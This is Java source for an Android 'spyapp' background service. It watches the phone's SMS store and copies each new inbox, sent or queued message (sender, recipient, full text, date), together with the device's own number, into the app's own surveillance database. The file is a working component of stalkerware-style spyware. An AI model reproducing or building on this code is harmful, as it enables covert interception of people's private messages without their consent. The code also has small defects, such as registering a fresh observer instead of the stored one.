package com.spyapp.android.service;

import android.app.Service;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.provider.Telephony;
import android.support.annotation.Nullable;
import android.telephony.TelephonyManager;

import com.spyapp.android.SpyApp;
import com.spyapp.android.model.Sms;
import com.spyapp.android.provider.SpyContracts;

public class SmsService extends Service {

    public static final Uri URI_SMS = Uri.parse("content://sms");

    private SmsObserver mSmsObserver;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        registerSmsObserver();
        return START_STICKY;
    }

    private void registerSmsObserver() {
        if (mSmsObserver == null) {
            mSmsObserver = new SmsObserver(new Handler());
            getContentResolver().registerContentObserver(
                    URI_SMS,
                    true,
                    new SmsObserver(new Handler())
            );
        }
    }

    class SmsObserver extends ContentObserver {

        private long mLastId;

        public SmsObserver(Handler handler) {
            super(handler);
        }

        @Override
        public boolean deliverSelfNotifications() {
            return true;
        }

        @Override
        public void onChange(boolean selfChange) {
            onChange(selfChange, null);
        }

        @Override
        public void onChange(boolean selfChange, Uri uri) {
            String[] projection = {"_id", "type", "address", "address", "body", "date"};
            Cursor c = getContentResolver().query(URI_SMS, projection, null, null, null);
            if (c != null && c.moveToFirst()) {
                long id = c.getLong(c.getColumnIndex("_id"));
                if (id != mLastId) {
                    int type = c.getInt(c.getColumnIndex("type"));
                    if (type == Telephony.TextBasedSmsColumns.MESSAGE_TYPE_QUEUED ||
                            type == Telephony.TextBasedSmsColumns.MESSAGE_TYPE_SENT ||
                            type == Telephony.TextBasedSmsColumns.MESSAGE_TYPE_INBOX)
                    {
                        TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
                        String deviceNumber = tm.getLine1Number();

                        String address = c.getString(c.getColumnIndex("address"));
                        String sender = (type == 2 || type == 6) ? deviceNumber : address;
                        String recipient = (type == 1) ? deviceNumber : address;

                        Sms sms = new Sms(
                                id,
                                type,
                                sender,
                                recipient,
                                c.getString(c.getColumnIndex("body")),
                                c.getLong(c.getColumnIndex("date"))
                        );

                        Uri affectedUri = getContentResolver().insert(SpyContracts.Sms.CONTENT_URI,
                                sms.prepareContentValues());
                        if (affectedUri != null) {
                            SpyApp.log("Sms insertion successed: " + affectedUri.toString());
                        } else {
                            SpyApp.log("Sms insertion failed");
                        }
                    }
                    mLastId = id;
                }
            }
            if (c != null && !c.isClosed()) {
                c.close();
            }
        }

    }

}